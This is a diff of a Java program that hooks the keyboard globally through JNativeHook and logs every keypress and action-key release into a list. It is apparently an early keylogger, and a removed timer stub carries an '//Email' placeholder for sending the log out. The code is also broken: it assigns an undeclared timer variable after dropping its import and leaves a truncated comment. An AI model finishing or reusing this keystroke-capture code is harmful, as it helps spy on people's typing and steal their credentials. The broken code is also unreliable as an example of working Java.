@@ -3,21 +3,23 @@ import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
+import javax.swing.*;
 import java.awt.*;
 import java.awt.datatransfer.DataFlavor;
 import java.awt.datatransfer.UnsupportedFlavorException;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
 import java.awt.event.KeyEvent;
 import java.awt.event.KeyListener;
 import java.io.IOException;
 import java.lang.annotation.Native;
+import java.util.ArrayList;
 import java.util.LinkedList;
-import java.util.Timer;
 import java.util.TimerTask;
 
-public class program implements NativeKeyListener {
+public class program implements NativeKeyListener, ActionListener {
 
-    private LinkedList<String> keypressList = new LinkedList<String>();
-    private String keyPresses;
+    private static LinkedList<String> keypressList = new LinkedList<String>();
 
     public static void main(String[]args) {
 
@@ -30,21 +32,19 @@ public class program implements NativeKeyListener {
         }
         GlobalScreen.addNativeKeyListener(new program());
 
-        //Initiate timer
-        Timer timer = new Timer();
-        TimerTask task = new TimerTask() {
-            @Override
-            public void run() {
-                //Email
+        //Initiate t
+        timerInitiation();
 
-            }
-        };
-        timer.schedule(task, 3000000);
+
+    }
+
+    public static void timerInitiation() {
+        t = new Timer();
     }
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
-
+        keypressList.addLast(e.getKeyText(e.getKeyCode()));
     }
 
     @Override
@@ -54,6 +54,13 @@ public class program implements NativeKeyListener {
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent e) {
+        if (e.isActionKey()) {
+            keypressList.addLast(e.getKeyText(e.getKeyCode()) + " released");
+        }
+    }
+
+    @Override
+    public void actionPerformed(ActionEvent actionEvent) {
 
     }
 }
